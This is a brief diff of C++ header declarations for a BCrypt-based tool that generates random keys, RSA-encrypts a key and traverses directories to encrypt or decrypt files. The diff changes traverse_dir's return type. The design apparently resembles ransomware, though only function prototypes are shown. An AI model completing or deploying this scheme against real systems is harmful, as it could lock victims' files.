@@ -10,5 +10,4 @@
 boolean gen_rand(std::vector<BYTE> &buffer);
 boolean set_algorithm(BCRYPT_ALG_HANDLE &hAlgorithm, LPCWSTR algorithm);
 boolean rsa_encrypt(std::vector<BYTE> &key, std::vector<BYTE> &newKey);
-
-void traverse_dir(int dir_size, const wchar_t *dir, BCRYPT_ALG_HANDLE &hAlgorithm, std::vector<BYTE> &iv, std::vector<BYTE> &key, DWORD &keyObjLen, const boolean encrypt);
+boolean traverse_dir(int dir_size, const wchar_t* dir, BCRYPT_ALG_HANDLE& hAlgorithm, std::vector<BYTE>& iv, std::vector<BYTE>& key, DWORD& keyObjLen, const boolean encrypt);
